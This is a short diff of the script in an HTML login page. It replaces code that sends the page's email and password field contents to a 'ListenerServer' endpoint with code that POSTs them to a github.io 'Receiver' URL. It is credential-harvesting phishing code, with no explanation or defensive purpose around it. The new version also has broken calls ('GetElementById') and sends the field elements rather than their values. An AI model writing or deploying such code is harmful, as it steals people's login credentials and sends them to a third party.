@@ -29,23 +29,17 @@
         </form>
       </div>
 	<script>
-	const Emailadd = document.getElementById('email');
-        const Password = document.getElementById('password');
-        const email = Emailadd.value;
-        const password = Password.value;
-		
-		let url = "https://my-json-server.typicode.com/dominator200/ListenerServer/posts";
-		let payload = {
-			emailadd: email,
-			pass: password
-		}
+		const Email = document.GetElementById("email")
+		const Password = document.GetElementById("password")
+	const url = "https://dominator200.github.io/Receiver8787462385790687/";
+const data = { Emailadd: Email, Passworddata:Password };
 
-		let options = {
-			method: "PUT",
-			body: JSON.stringify(payload)
-		}
-		fetch(url, options)
-		.then(response => console.log(response.status))
+fetch(url, {method: "POST",headers: {"Content-Type": "application/json",
+  },body: JSON.stringify(data),
+})
+  .then(response => response.json())
+  .then(data => console.log(data))
+  .catch(error => console.error("Error:", error));
 	</script>
 </body>
 </html>
